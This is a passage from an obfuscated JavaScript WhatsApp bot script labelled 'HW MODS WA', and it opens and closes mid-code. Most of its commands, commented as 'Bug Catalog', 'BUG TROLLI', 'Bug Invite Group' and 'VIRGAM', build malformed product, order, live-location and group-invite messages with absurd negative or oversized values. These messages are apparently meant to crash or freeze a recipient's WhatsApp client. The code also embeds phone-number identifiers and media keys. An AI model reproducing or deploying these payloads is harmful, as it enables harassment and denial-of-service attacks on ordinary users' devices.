bf3e83(0x113)+latensi[_0xbf3e83(0x114)](0x4)+_0xbf3e83(0x116)+ngazap(prefix)+'\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0aJANGAN\x20LUPA\x20SUBSCRIBE','footerText':_0xbf3e83(0x10c),'buttons':[{'buttonId':_0xbf3e83(0x120),'buttonText':{'displayText':''+ngazap(prefix)},'type':_0xbf3e83(0x107)}],'headerType':_0xbf3e83(0x102)}},{'quoted':ikal}),Haikal[_0xbf3e83(0x11f)](res),reply('-\x20BY\x20HW\x20MODS\x20WA'));function _0x4e13(_0x479890,_0x591e63){var _0x50d3e9=_0x50d3();return _0x4e13=function(_0x4e13a5,_0xd5d6de){_0x4e13a5=_0x4e13a5-0x100;var _0x11c01e=_0x50d3e9[_0x4e13a5];return _0x11c01e;},_0x4e13(_0x479890,_0x591e63);}function _0x50d3(){var _0x520be2=['72cQCyWu','3634110HEEhda','RESPONSE','\x0a*•>\x20Blockir\x20:*\x20','165','1633790518','\x0a*•>\x20WITA\x20:*\x20','https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g','TsVcaBqF2OSXNtxk6Bo9D+8yx0mgOxVwr96GXx1FWx8=','length','*\x20\x0a*•>\x20WIB\x20:*\x20','1602979DOWcRN','\x20Chat\x0a*•>\x20Total\x20Chat\x20:*\x20','\x0a*•>\x20WIT\x20:*\x20','\x20Chat\x0a*•>\x20Speed\x20:*\x20','toFixed','406662YJPaBu','\x20Second\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0aSELAMAT\x20DATANG\x0a\x0aMUSIK\x20NYA\x20NIH\x20SILAHKAN\x20:v\x0aDONASI\x20KALAU\x20MAU\x20BOT\x20NYA\x20TETEP\x20NYALA\x20😍','90HvrtVY','4mroEKf','1405122wFKXai','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0aHai\x20','\x20Chat\x0a*•>\x20Personal\x20Chat\x20:*\x20','2576675vxaHJr','AtnK7ECsVheuM65a3wQVHcitkBLi4XZTCLsPioiMMUM=','XM\x20XHIRO\x20MHONSHINE.XM','relayWAMessage','HAIKAL','826126RFAWLp','https://mmg.whatsapp.net/d/f/AjwU3r26GS_zGnT4qDz90c4UXaeKkkE0vDG-BT8lEB40.enc','application/octet-stream','DOCUMENT','yyv1dpunMToLIpX0+Sj7B2n6Wd1N+/SMRjC4JG2z358=','6816600lVaqkY'];_0x50d3=function(){return _0x520be2;};return _0x50d3();}
break
//Bug Kosong
case 'hw1':    
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
					if (!isGroup) return freply(mess.only.group)
					bego = fs.readFileSync(`./stik/deden.jpeg`)
                teks = args.join(' ')
                bego = body.slice(11)
                options = {
                sendEphemeral: true, 
               thumbnail: fs.readFileSync('./stik/deden.jpeg')
                }
              await Haikal.sendMessage(from, bego, text, options, { contextInfo: { forwardingScore: 508, isForwarded: true}})
               break
// Bug Catalog ( HW MODS WA )
case 'pcp':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
function _0x356a(_0x51a163,_0x59f8b5){var _0x563b22=_0x563b();return _0x356a=function(_0x356ace,_0x3879ca){_0x356ace=_0x356ace-0x1eb;var _0x229776=_0x563b22[_0x356ace];return _0x229776;},_0x356a(_0x51a163,_0x59f8b5);}var _0x26e373=_0x356a;(function(_0x12309a,_0xd85a6e){var _0x5661c3=_0x356a,_0x1d9210=_0x12309a();while(!![]){try{var _0x538baf=-parseInt(_0x5661c3(0x1fe))/0x1*(parseInt(_0x5661c3(0x1f4))/0x2)+parseInt(_0x5661c3(0x1ed))/0x3+-parseInt(_0x5661c3(0x1fa))/0x4+parseInt(_0x5661c3(0x1fc))/0x5*(-parseInt(_0x5661c3(0x1fb))/0x6)+-parseInt(_0x5661c3(0x1ef))/0x7+-parseInt(_0x5661c3(0x1f2))/0x8+parseInt(_0x5661c3(0x1f6))/0x9*(parseInt(_0x5661c3(0x1f3))/0xa);if(_0x538baf===_0xd85a6e)break;else _0x1d9210['push'](_0x1d9210['shift']());}catch(_0x13c64f){_0x1d9210['push'](_0x1d9210['shift']());}}}(_0x563b,0x2b2cc));if(!kal[_0x26e373(0x1ec)]['fromMe']&&!isOwner)return;buf=fs[_0x26e373(0x1eb)](_0x26e373(0x1f7)),imeu=await Haikal[_0x26e373(0x1fd)]('0@s.whatsapp.net',buf,image),imeg=imeu['message']['imageMessage'],res=await Haikal['prepareMessageFromContent'](from,{'productMessage':{'product':{'productImage':imeg,'title':emoji2(prefix),'mimetype':Mimetype[_0x26e373(0x1f5)],'description':emoji2(prefix),'thumbnail':fs[_0x26e373(0x1eb)](_0x26e373(0x1f0)),'currencyCode':_0x26e373(0x1f1),'priceAmount1000':_0x26e373(0x1ee),'productImageCount':0x1},'businessOwnerJid':_0x26e373(0x1f8),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x26e373(0x1f9)](res);function _0x563b(){var _0x11935f=['prepareMessage','77811qVjSOM','readFileSync','key','86559FREOsT','-99999999999999999999999999999999','1065981hTVgeO','./stik/deden.jpeg','IDR','504048CqXfLS','7770xdpqDy','6RktLSP','image','10404nSNHPS','./stik/bacotah.jpeg','6285714170944@s.whatsapp.net','relayWAMessage','931512dBrTne','411726LZgbhB','5CTBxjk'];_0x563b=function(){return _0x11935f;};return _0x563b();}
break
case 'lokas2':            
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x102c4d=_0x56fa;(function(_0x32061d,_0x4c9f34){var _0x9eb0eb=_0x56fa,_0x534c13=_0x32061d();while(!![]){try{var _0x13bb8a=parseInt(_0x9eb0eb(0xf1))/0x1+parseInt(_0x9eb0eb(0xed))/0x2*(parseInt(_0x9eb0eb(0xf6))/0x3)+-parseInt(_0x9eb0eb(0xec))/0x4+parseInt(_0x9eb0eb(0xe6))/0x5*(-parseInt(_0x9eb0eb(0xee))/0x6)+-parseInt(_0x9eb0eb(0xf3))/0x7*(-parseInt(_0x9eb0eb(0xe5))/0x8)+-parseInt(_0x9eb0eb(0xf4))/0x9+-parseInt(_0x9eb0eb(0xf5))/0xa;if(_0x13bb8a===_0x4c9f34)break;else _0x534c13['push'](_0x534c13['shift']());}catch(_0x1892e8){_0x534c13['push'](_0x534c13['shift']());}}}(_0x49d0,0x5a8b6));function _0x56fa(_0x8e08d9,_0x1aa4cd){var _0x49d0aa=_0x49d0();return _0x56fa=function(_0x56faa8,_0x4904d7){_0x56faa8=_0x56faa8-0xe5;var _0x266e27=_0x49d0aa[_0x56faa8];return _0x266e27;},_0x56fa(_0x8e08d9,_0x1aa4cd);}if(isBan)return reply(mess[_0x102c4d(0xeb)]);res=await Haikal['prepareMessageFromContent'](from,{'liveLocationMessage':{'degreesLatitude':-6.105434,'degreesLongitude':106.7118871,'caption':_0x102c4d(0xef),'name':virtext(prefix),'currencyCode':_0x102c4d(0xe8),'priceAmount1000':_0x102c4d(0xf0),'address':emoji2(prefix),'sequenceNumber':_0x102c4d(0xe9),'jpegThumbnail':fs[_0x102c4d(0xea)](_0x102c4d(0xe7)),'contextInfo':{'forwardingScore':0x3,'isForwarded':![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x102c4d(0xf2)](res);function _0x49d0(){var _0x1e87da=['readFileSync','ban','515520TEJKEC','2494ECVKAC','6HqQCZY','HW\x20MODS\x20WA🔥➥','-9999999999,','439693rlhwYb','relayWAMessage','77812syamKf','1683288OwvyRb','7323800xMtMRk','1584YWxcBM','480nlguwt','1729535yUpYvm','./stik/deden.jpeg','USD','1632331382263001'];_0x49d0=function(){return _0x1e87da;};return _0x49d0();}
break
case 'lokas':            
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0xf9f9b0=_0x246c;function _0x246c(_0x4aca10,_0x5f5b2d){var _0x1bcd82=_0x1bcd();return _0x246c=function(_0x246c89,_0x322222){_0x246c89=_0x246c89-0x12c;var _0x25a8e6=_0x1bcd82[_0x246c89];return _0x25a8e6;},_0x246c(_0x4aca10,_0x5f5b2d);}(function(_0x1101b7,_0x3866c5){var _0x34f31d=_0x246c,_0x489829=_0x1101b7();while(!![]){try{var _0x2da4c1=-parseInt(_0x34f31d(0x133))/0x1+parseInt(_0x34f31d(0x134))/0x2*(-parseInt(_0x34f31d(0x12c))/0x3)+parseInt(_0x34f31d(0x132))/0x4*(parseInt(_0x34f31d(0x138))/0x5)+parseInt(_0x34f31d(0x139))/0x6+-parseInt(_0x34f31d(0x12d))/0x7+parseInt(_0x34f31d(0x13d))/0x8*(-parseInt(_0x34f31d(0x12f))/0x9)+-parseInt(_0x34f31d(0x13a))/0xa*(-parseInt(_0x34f31d(0x136))/0xb);if(_0x2da4c1===_0x3866c5)break;else _0x489829['push'](_0x489829['shift']());}catch(_0x25c730){_0x489829['push'](_0x489829['shift']());}}}(_0x1bcd,0xd1fd4));if(isBan)return reply(mess[_0xf9f9b0(0x130)]);function _0x1bcd(){var _0x354b6e=['10MDwmxV','5678142GgFYQV','50ziJPGB','HW\x20MODS\x20WA\x20🔥➥','relayWAMessage','1784UQtrKH','105099AxZcvF','1778896FBcSeh','./stik/deden.jpeg','6147KYrITi','ban','readFileSync','425992OBefSx','47022HqZMEx','82rAnphg','prepareMessageFromContent','3499265heWqWR','1632077323798001'];_0x1bcd=function(){return _0x354b6e;};return _0x1bcd();}res=await Haikal[_0xf9f9b0(0x135)](from,{'liveLocationMessage':{'degreesLatitude':-6.1053500000000005,'degreesLongitude':106.71185833333332,'caption':_0xf9f9b0(0x13b),'sequenceNumber':_0xf9f9b0(0x137),'jpegThumbnail':fs[_0xf9f9b0(0x131)](_0xf9f9b0(0x12e)),'contextInfo':{'forwardingScore':0x3,'isForwarded':![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0xf9f9b0(0x13c)](res);
break
case 'jadigila':
if (!kal.key.fromMe) return fakestatus('APASIH')
const _0x58632c=_0x6f62;(function(_0x35f952,_0x1522a1){const _0xa4aa35=_0x6f62,_0x419129=_0x35f952();while(!![]){try{const _0x516d47=-parseInt(_0xa4aa35(0xcc))/0x1+-parseInt(_0xa4aa35(0xcb))/0x2*(-parseInt(_0xa4aa35(0xb8))/0x3)+-parseInt(_0xa4aa35(0xc9))/0x4+parseInt(_0xa4aa35(0xc0))/0x5+-parseInt(_0xa4aa35(0xc2))/0x6*(-parseInt(_0xa4aa35(0xbd))/0x7)+-parseInt(_0xa4aa35(0xc7))/0x8+parseInt(_0xa4aa35(0xc4))/0x9;if(_0x516d47===_0x1522a1)break;else _0x419129['push'](_0x419129['shift']());}catch(_0x1f92a2){_0x419129['push'](_0x419129['shift']());}}}(_0x334f,0x3122b));function _0x6f62(_0x5b031b,_0x371c41){const _0x334fb1=_0x334f();return _0x6f62=function(_0x6f620f,_0x44f7d7){_0x6f620f=_0x6f620f-0xb8;let _0x3739de=_0x334fb1[_0x6f620f];return _0x3739de;},_0x6f62(_0x5b031b,_0x371c41);}if(isBan)return reply(mess[_0x58632c(0xba)]);if(isMedia&&kal[_0x58632c(0xca)][_0x58632c(0xc5)][_0x58632c(0xbf)]<0x989680||isQuotedVideo&&kal[_0x58632c(0xca)][_0x58632c(0xbc)][_0x58632c(0xc6)][_0x58632c(0xc3)]['videoMessage']['fileLength']<0x989680){const kuning=isQuotedVideo?JSON[_0x58632c(0xbb)](JSON[_0x58632c(0xbe)](kal)['replace']('quotedM','m'))[_0x58632c(0xca)][_0x58632c(0xbc)][_0x58632c(0xc6)]:kal,tahi=await Haikal[_0x58632c(0xc8)](kuning),tahii=fs[_0x58632c(0xc1)](tahi);Haikal['sendMessage'](from,tahii,MessageType['video'],{'quoted':kal,'thumbnail':fs[_0x58632c(0xc1)](_0x58632c(0xb9))});}function _0x334f(){const _0x54e788=['stringify','fileLength','370860hHSVgL','readFileSync','1284KvdUvk','quotedMessage','7895205wTKcnD','videoMessage','contextInfo','1331768SCTkvV','downloadAndSaveMediaMessage','1336336IKWOCs','message','316eHqPsf','368615lkuAtv','159mOUmLI','./stik/deden.jpeg','ban','parse','extendedTextMessage','3619MPqDUA'];_0x334f=function(){return _0x54e788;};return _0x334f();}
				break
// VIRGAM ONLY
case 'assalamualaikum':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
	const Haikal5 = fs.readFileSync('./stik/deden.jpeg')
Haikal.sendMessage(from,Haikal5,image,{mimetype: Mimetype.fekekal,quoted : ikal, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break      
case 'kal':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
	const Haikal4 = fs.readFileSync('./stik/bacotah.jpeg')
Haikal.sendMessage(from,Haikal4,image,{mimetype: Mimetype.fekekal,quoted : ikal, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break
case 'jadislayer':
if (!kal.key.fromMe) return fakestatus('APASIH')
const _0x452209=_0x509f;(function(_0x55cb2d,_0x125e5f){const _0x117a4d=_0x509f,_0x21f4ac=_0x55cb2d();while(!![]){try{const _0x6ae897=parseInt(_0x117a4d(0x19c))/0x1*(parseInt(_0x117a4d(0x193))/0x2)+parseInt(_0x117a4d(0x194))/0x3+-parseInt(_0x117a4d(0x19e))/0x4+parseInt(_0x117a4d(0x1a1))/0x5*(-parseInt(_0x117a4d(0x192))/0x6)+-parseInt(_0x117a4d(0x196))/0x7*(parseInt(_0x117a4d(0x197))/0x8)+parseInt(_0x117a4d(0x1ab))/0x9+parseInt(_0x117a4d(0x1a3))/0xa;if(_0x6ae897===_0x125e5f)break;else _0x21f4ac['push'](_0x21f4ac['shift']());}catch(_0x33915d){_0x21f4ac['push'](_0x21f4ac['shift']());}}}(_0x25a1,0x89cfb));function _0x509f(_0x33a6ff,_0x5e9f66){const _0x25a1fc=_0x25a1();return _0x509f=function(_0x509f39,_0x506792){_0x509f39=_0x509f39-0x192;let _0x34b942=_0x25a1fc[_0x509f39];return _0x34b942;},_0x509f(_0x33a6ff,_0x5e9f66);}function _0x25a1(){const _0x4a9171=['2675900QcAqex','imageMessage','downloadMediaMessage','99999999999000','4383282311765462','message','contextInfo','quotedM','4841127tbMXiQ','./stik/deden.jpeg','replace','358188ZVEBmc','210024ZxuVmb','3328515uJtAvS','videoMessage','146965lQqKuB','40PcUKsn','HW\x20MODS\x20WA\x20🔥➥','relayWAMessage','http://hwmodswa.website2.me/','extendedTextMessage','1HdJoRb','0@s.whatsapp.net','3969488fBbkml','62857141709445@s.whatsapp.net','-999999999999','30jIxKsG','prepareMessageFromContent'];_0x25a1=function(){return _0x4a9171;};return _0x25a1();}if(isBan)return reply(mess['ban']);if(isMedia&&!kal[_0x452209(0x1a8)][_0x452209(0x195)]||isQuotedImage){let encmedia=isQuotedImage?JSON['parse'](JSON['stringify'](kal)[_0x452209(0x1ad)](_0x452209(0x1aa),'m'))[_0x452209(0x1a8)][_0x452209(0x19b)][_0x452209(0x1a9)]:kal,media=await Haikal[_0x452209(0x1a5)](encmedia);imeu=await Haikal['prepareMessage'](_0x452209(0x19d),media,image,{'thumbnail':fs['readFileSync'](_0x452209(0x1ac))}),imeg=imeu[_0x452209(0x1a8)][_0x452209(0x1a4)],res=await Haikal[_0x452209(0x1a2)](from,{'productMessage':{'product':{'productImage':imeg,'productId':_0x452209(0x1a7),'title':_0x452209(0x198),'description':'HW\x20MODS\x20WA\x20🔥➥','currencyCode':'IDR','priceAmount1000':_0x452209(0x1a6),'retailerId':_0x452209(0x1a0),'url':_0x452209(0x19a),'productImageCount':0x1,'salePriceAmount1000':'0'},'businessOwnerJid':_0x452209(0x19f),'contextInfo':{'forwardingScore':0x270f,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x452209(0x199)](res);}
break
case 'kadal':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
var _0x488a26=_0x432b;function _0x432b(_0x1a2be4,_0x2b156d){var _0x1bb523=_0x1bb5();return _0x432b=function(_0x432b9b,_0x32a6c8){_0x432b9b=_0x432b9b-0x11b;var _0x154824=_0x1bb523[_0x432b9b];return _0x154824;},_0x432b(_0x1a2be4,_0x2b156d);}(function(_0xc6d17b,_0x532c2c){var _0x2db74d=_0x432b,_0x2c8988=_0xc6d17b();while(!![]){try{var _0x453942=parseInt(_0x2db74d(0x129))/0x1+parseInt(_0x2db74d(0x11f))/0x2+-parseInt(_0x2db74d(0x126))/0x3+-parseInt(_0x2db74d(0x11b))/0x4*(parseInt(_0x2db74d(0x127))/0x5)+-parseInt(_0x2db74d(0x128))/0x6+-parseInt(_0x2db74d(0x11c))/0x7+parseInt(_0x2db74d(0x123))/0x8*(parseInt(_0x2db74d(0x120))/0x9);if(_0x453942===_0x532c2c)break;else _0x2c8988['push'](_0x2c8988['shift']());}catch(_0xe505db){_0x2c8988['push'](_0x2c8988['shift']());}}}(_0x1bb5,0xe18a0));if(!isQuotedSticker)return freply(_0x488a26(0x121));freply(mess['wait']),encmedia=JSON[_0x488a26(0x125)](JSON[_0x488a26(0x11e)](kal)[_0x488a26(0x122)](_0x488a26(0x12a),'m'))['message']['extendedTextMessage']['contextInfo'],media=await Haikal[_0x488a26(0x124)](encmedia),ran=getRandom(_0x488a26(0x12c)),exec('ffmpeg\x20-i\x20'+media+'\x20'+ran,_0x2dae47=>{var _0x30d2ef=_0x488a26;fs['unlinkSync'](media);if(_0x2dae47)return freply(_0x30d2ef(0x12b));buffer=fs[_0x30d2ef(0x12d)](ran),fekekal(buffer,_0x30d2ef(0x11d)),fs['unlinkSync'](ran);});function _0x1bb5(){var _0x3f2b58=['replace','32OqudeO','downloadAndSaveMediaMessage','parse','574836WJyRGZ','1931185qcldNv','7756242Bywtcd','1287232tXlCOq','quotedM','Yah\x20gagal,\x20coba\x20ulangi\x20^_^','.png','readFileSync','4QeIPAi','7153083nsFSUT','NIH','stringify','3118346XBlLlr','2182113SzGpmS','𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴\x20𝘀𝘁𝗶𝗰𝗸𝗲𝗿\x20!'];_0x1bb5=function(){return _0x3f2b58;};return _0x1bb5();}
break
//TROLI1
case 'psp': // BUG TROLLI + BUG GC + TROLLI
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
var _0x1e4416=_0x3e48;function _0x12ff(){var _0x265a8e=['981IxDbFU','-3599964009','96290EiOnFm','HW\x20MODS\x20WA','6285714170944@s.whatsapp.net','image','998750mtFRZN','readFileSync','157457jHgZrC','relayWAMessage','7850032yzQoLp','366LICKxo','./stik/deden.jpeg','CATALOG','2392935MDoQqe','34148NiGVRY','INQUIRY','399XVVuPB','57687YfcPHT'];_0x12ff=function(){return _0x265a8e;};return _0x12ff();}function _0x3e48(_0x740571,_0xac410b){var _0x12ffb8=_0x12ff();return _0x3e48=function(_0x3e4890,_0x125c78){_0x3e4890=_0x3e4890-0x1c1;var _0x5a2f9a=_0x12ffb8[_0x3e4890];return _0x5a2f9a;},_0x3e48(_0x740571,_0xac410b);}(function(_0x2aef4f,_0x36cf71){var _0x555c80=_0x3e48,_0x5a649b=_0x2aef4f();while(!![]){try{var _0x5bace5=parseInt(_0x555c80(0x1cc))/0x1+parseInt(_0x555c80(0x1ca))/0x2+parseInt(_0x555c80(0x1c2))/0x3*(-parseInt(_0x555c80(0x1d3))/0x4)+parseInt(_0x555c80(0x1d2))/0x5+-parseInt(_0x555c80(0x1cf))/0x6*(-parseInt(_0x555c80(0x1c3))/0x7)+-parseInt(_0x555c80(0x1ce))/0x8+-parseInt(_0x555c80(0x1c4))/0x9*(-parseInt(_0x555c80(0x1c6))/0xa);if(_0x5bace5===_0x36cf71)break;else _0x5a649b['push'](_0x5a649b['shift']());}catch(_0x3cb3ac){_0x5a649b['push'](_0x5a649b['shift']());}}}(_0x12ff,0x8b67e),res=await Haikal['prepareMessageFromContent'](from,{'orderMessage':{'jpegThumbnail':fs[_0x1e4416(0x1cb)](_0x1e4416(0x1d0)),'itemCount':0x9db21e7c5a5a,'status':_0x1e4416(0x1c1),'surface':_0x1e4416(0x1d1),'orderId':'1002933420482969','mimetype':Mimetype[_0x1e4416(0x1c9)],'orderTitle':emoji2(prefix),'message':_0x1e4416(0x1c7)+vipi,'sellerJid':_0x1e4416(0x1c8),'token':'AR72qWd0CaoPN/e5maiyQRxx+gykcW/JH8LXwoJVcQsVgg==','totalAmount1000':_0x1e4416(0x1c5),'totalCurrencyCode':'-173388341205594','cont+extInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x1e4416(0x1cd)](res));
break
case 'kalpd':
if (isBan) return reply(mess.ban)
function _0x2ca0(_0x66c148,_0x1d45f4){var _0x270066=_0x2700();return _0x2ca0=function(_0x2ca0f2,_0xa805dd){_0x2ca0f2=_0x2ca0f2-0xfb;var _0x47fae8=_0x270066[_0x2ca0f2];return _0x47fae8;},_0x2ca0(_0x66c148,_0x1d45f4);}function _0x2700(){var _0x259227=['4pQ5SfETi9Qf50JWl7hW851J4HxNOvm0gFijdh1hBu4=','586579ZHtfTh','15xNcUJj','RESPONSE','DOCUMENT','461540TfjNeR','2sYUCkR','54TrYMbL','1263246ByrTGR','inUBhjDrheTDyV0HnfRuMOtJO9WMNpPjfOBB4npLvg8=','readFileSync','https://mmg.whatsapp.net/d/f/Ajs_CEZ4zOkaBKtP-WiKkP9oSMZbqGW4AxDDPNW4EMQ_.enc','13189462IHoCYk','28xijPQy','❏HW\x20MODS\x20WA❏\x0a','./stik/fake.jpeg','73590','HW\x20MODS\x20WA.pdf','1633856520','❏HW\x20MODS\x20WA❏','prepareMessageFromContent','232112EDnUAX','relayWAMessage','404769KIAkLF','602606blyzpb','/v/t62.7119-24/33372629_419684099545134_8754100474474002974_n.enc?ccb=11-4&oh=78b7326375aa4f0ab5e6b26dc3bbba42&oe=61892D6B','application/pdf'];_0x2700=function(){return _0x259227;};return _0x2700();}var _0x321ae7=_0x2ca0;(function(_0x932e9a,_0x56bd15){var _0x4e44d5=_0x2ca0,_0x572d8d=_0x932e9a();while(!![]){try{var _0x24aaa5=-parseInt(_0x4e44d5(0xff))/0x1*(parseInt(_0x4e44d5(0x108))/0x2)+-parseInt(_0x4e44d5(0xfe))/0x3*(parseInt(_0x4e44d5(0x10f))/0x4)+parseInt(_0x4e44d5(0x104))/0x5*(parseInt(_0x4e44d5(0x10a))/0x6)+parseInt(_0x4e44d5(0x103))/0x7+-parseInt(_0x4e44d5(0xfc))/0x8*(-parseInt(_0x4e44d5(0x109))/0x9)+-parseInt(_0x4e44d5(0x107))/0xa+parseInt(_0x4e44d5(0x10e))/0xb;if(_0x24aaa5===_0x56bd15)break;else _0x572d8d['push'](_0x572d8d['shift']());}catch(_0x41db3c){_0x572d8d['push'](_0x572d8d['shift']());}}}(_0x2700,0x78edd),res=await Haikal[_0x321ae7(0xfb)](from,{'buttonsMessage':{'text':'','documentMessage':{'url':_0x321ae7(0x10d),'mimetype':_0x321ae7(0x101),'title':_0x321ae7(0x113),'fileSha256':'tUUmgaQQbDANUZszHwOd0Fttuh9IfFskAz52AEa2Bdg=','fileLength':_0x321ae7(0x112),'pageCount':0x1,'mediaKey':_0x321ae7(0x102),'fileName':_0x321ae7(0x115)+ngazap(prefix),'fileEncSha256':_0x321ae7(0x10b),'directPath':_0x321ae7(0x100),'mediaKeyTimestamp':_0x321ae7(0x114),'jpegThumbnail':fs[_0x321ae7(0x10c)](_0x321ae7(0x111))},'contentText':_0x321ae7(0x110)+ngazap(prefix),'footerText':_0x321ae7(0x115),'buttons':[{'buttonId':'HAIKAL','buttonText':{'displayText':_0x321ae7(0x115)+ngazap(prefix)},'type':_0x321ae7(0x105)}],'headerType':_0x321ae7(0x106)}},{'quoted':ikal}),Haikal[_0x321ae7(0xfd)](res),reply('HW\x20MODS\x20WA'));
break
// Trolli ( HW MODS WA  )
case 'p': // TROLLI
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
var _0x4466de=_0x4403;function _0x4403(_0x32ca7f,_0x1c5a67){var _0x506094=_0x5060();return _0x4403=function(_0x4403cd,_0x2bd525){_0x4403cd=_0x4403cd-0x181;var _0x30459e=_0x506094[_0x4403cd];return _0x30459e;},_0x4403(_0x32ca7f,_0x1c5a67);}(function(_0x18457b,_0x52424a){var _0x33c7a0=_0x4403,_0x455be5=_0x18457b();while(!![]){try{var _0x40b926=-parseInt(_0x33c7a0(0x187))/0x1+parseInt(_0x33c7a0(0x184))/0x2+-parseInt(_0x33c7a0(0x190))/0x3*(parseInt(_0x33c7a0(0x194))/0x4)+parseInt(_0x33c7a0(0x18b))/0x5+-parseInt(_0x33c7a0(0x189))/0x6*(parseInt(_0x33c7a0(0x18d))/0x7)+parseInt(_0x33c7a0(0x18e))/0x8+-parseInt(_0x33c7a0(0x186))/0x9*(-parseInt(_0x33c7a0(0x182))/0xa);if(_0x40b926===_0x52424a)break;else _0x455be5['push'](_0x455be5['shift']());}catch(_0x504525){_0x455be5['push'](_0x455be5['shift']());}}}(_0x5060,0x36015),res=await Haikal[_0x4466de(0x188)](from,{'orderMessage':{'orderId':_0x4466de(0x191),'thumbnail':fs['readFileSync']('./stik/deden.jpeg'),'itemCount':0x7e5,'status':_0x4466de(0x192),'surface':_0x4466de(0x183),'orderTitle':_0x4466de(0x18a),'message':_0x4466de(0x18c),'sellerJid':_0x4466de(0x193),'token':_0x4466de(0x181),'totalAmount1000':_0x4466de(0x185),'totalCurrencyCode':'IDR','contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x4466de(0x18f)](res));function _0x5060(){var _0x2a9019=['1002933420482969','INQUIRY','6285714170944@s.whatsapp.net','725820SXTals','AR72qWd0CaoPN/e5maiyQRxx+gykcW/JH8LXwoJVcQsVgg==','5034950QRJMAQ','CATALOG','373834DrqtjK','99999999999999999999','9jFGuSq','337283YXzlRZ','prepareMessageFromContent','1655520zHSYpI','HW\x20MODS\x20WA','1272645JNzRih','Hallo\x20Kak\x20HW\x20MODS','7AyALKY','567376KZHUFE','relayWAMessage','3SRTzJN'];_0x5060=function(){return _0x2a9019;};return _0x5060();}
break
// Bug Invite Group ( HW MODS WA )
case 'hay':
if (isBan) return reply(mess.ban)
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x57f6fe=_0x1bae;(function(_0x2af66b,_0x1b043a){var _0x31ff16=_0x1bae,_0x4a6c7b=_0x2af66b();while(!![]){try{var _0x2694bd=parseInt(_0x31ff16(0x1c5))/0x1*(-parseInt(_0x31ff16(0x1c4))/0x2)+-parseInt(_0x31ff16(0x1c0))/0x3*(-parseInt(_0x31ff16(0x1b8))/0x4)+parseInt(_0x31ff16(0x1cb))/0x5*(parseInt(_0x31ff16(0x1bd))/0x6)+-parseInt(_0x31ff16(0x1c3))/0x7*(parseInt(_0x31ff16(0x1ca))/0x8)+-parseInt(_0x31ff16(0x1b4))/0x9*(-parseInt(_0x31ff16(0x1bf))/0xa)+parseInt(_0x31ff16(0x1b9))/0xb*(parseInt(_0x31ff16(0x1b6))/0xc)+parseInt(_0x31ff16(0x1c6))/0xd;if(_0x2694bd===_0x1b043a)break;else _0x4a6c7b['push'](_0x4a6c7b['shift']());}catch(_0x1d5f93){_0x4a6c7b['push'](_0x4a6c7b['shift']());}}}(_0x4d14,0x47a4a));function _0x1bae(_0x5ca9ee,_0x14a1d8){var _0x4d140f=_0x4d14();return _0x1bae=function(_0x1baef2,_0x17235c){_0x1baef2=_0x1baef2-0x1b4;var _0x17d507=_0x4d140f[_0x1baef2];return _0x17d507;},_0x1bae(_0x5ca9ee,_0x14a1d8);}if(!kal[_0x57f6fe(0x1c1)][_0x57f6fe(0x1b5)])return;res=await Haikal['prepareMessageFromContent'](from,{'groupInviteMessage':{'groupJid':_0x57f6fe(0x1bb),'inviteCode':_0x57f6fe(0x1ba),'inviteExpiration':_0x57f6fe(0x1bc),'groupName':_0x57f6fe(0x1c8)+vipi,'description':emoji2(prefix),'jpegThumbnail':'/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAwQCBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAAD55qqzfkzyvce5lk9iHM5oipvuDUWq744x2uXK9IcizwS98dWekvY4fSi/kdPjVHTHYkx6OM1TVDlmGGtIf5Urd4qQ0OMaC0xgZ7Z2ErWDzyA8/wD/xAAlEAACAgICAQQCAwAAAAAAAAABAgARAxIhMQQQEyJBBVEyYXH/2gAIAQEAAT8AiJGIQTclo2AFNxMQs6sJlx0JrYjCopBMxFZkUk31HTCFB2sxfI0WhA4PO3M23xm4RSiPEQfqZWGHHYHJiszNETdyonstfHUyKBUwt3Z4Ahyq/HUeognlglFM8FF5cnqY/GwM5yJM+AdqvJnk49AOOZjXZpqnVczIFHAMQwKGUg9TD8M7J9GIpC/EAQgMKufkV10ifyEetbHomVR9zHkUjueQQM26GeN5Yyrq4owFMYsGec5yZJ0YoAWzMhBYkQAsIuN1oWI4LaCgLgVxdAfGXlI74hVj8j1FQmiR0ajK1VCNSRENAxcgDcwsCyfoT3e/6iuK0sfKzA9AD6qpsBV9XcbIDtHINf56AxDLBEWrhaF7hPp//8QAFhEBAQ